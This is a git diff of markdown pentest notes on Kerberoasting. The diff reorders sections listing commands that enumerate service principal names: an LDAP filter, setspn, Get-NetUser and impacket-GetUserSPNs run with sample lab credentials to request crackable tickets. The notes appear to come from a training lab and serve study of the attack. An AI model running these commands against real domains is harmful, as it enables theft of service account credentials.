@@ -6,6 +6,10 @@ SPN is an attribute (servicePrincipalName) that ties a service to a user account
 - Credentials
 - SPN
 ## Enumeration
+### LDAP
+```
+(&(objectClass=user)(objectCategory=user)(servicePrincipalName=*))
+```
 ### PowerShell
 ```
 setspn -T research -Q */*
@@ -14,15 +18,10 @@ setspn -T research -Q */*
 ```
 Get-NetUser | Where-Object {$_.servicePrincipalName}
 ```
-### LDAP
-```
-(&(objectClass=user)(objectCategory=user)(servicePrincipalName=*))
-```
 ### impacket-GetUserSPNs
 ```
 impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 10.0.2.15 -request
 ```
-
 ## Attack Overview
 1. Run impacket-GetUserSPNs using known credentials
 ```
